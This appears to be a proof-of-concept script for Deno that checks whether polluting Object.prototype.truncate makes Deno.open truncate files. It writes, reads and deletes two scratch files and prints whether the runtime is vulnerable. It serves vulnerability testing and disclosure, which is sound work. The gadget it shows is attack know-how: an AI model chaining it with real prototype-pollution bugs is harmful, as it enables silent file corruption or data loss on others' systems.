function pollute(key: string, value: any) {
    ((((Object as any).prototype as any)[key]) as any) = value;
}

const orgData = new TextEncoder().encode("Hello  world!");
const newData = new TextEncoder().encode("foobar");

const file1 = await Deno.open("./not-polluted", { create: true, write: true });
const file2 = await Deno.open("./yes-polluted", { create: true, write: true });
await file1.write(orgData);
await file2.write(orgData);

let unpolluted: string | null = null;
{
    const wfile = await Deno.open("./not-polluted", { write: true });
    await wfile.write(newData);
    wfile.close();

    const rfile = await Deno.open("./not-polluted", { read: true, append: false });
    const buffer = new Uint8Array(16);
    await rfile.read(buffer);
    unpolluted = new TextDecoder().decode(buffer);
}

let polluted: string | null = null;
{
    pollute("truncate", true);

    const wfile = await Deno.open("./yes-polluted", { write: true });
    await wfile.write(newData);
    wfile.close();

    const rfile = await Deno.open("./yes-polluted", { read: true, truncate: false });
    const buffer = new Uint8Array(16);
    await rfile.read(buffer);
    polluted = new TextDecoder().decode(buffer);
}

await Deno.remove("./not-polluted");
await Deno.remove("./yes-polluted");

if (unpolluted !== polluted) {
    console.log("Your Deno version is vulnerable to this gadget.");
} else {
    console.log("Your Deno version is NOT affected.");
}
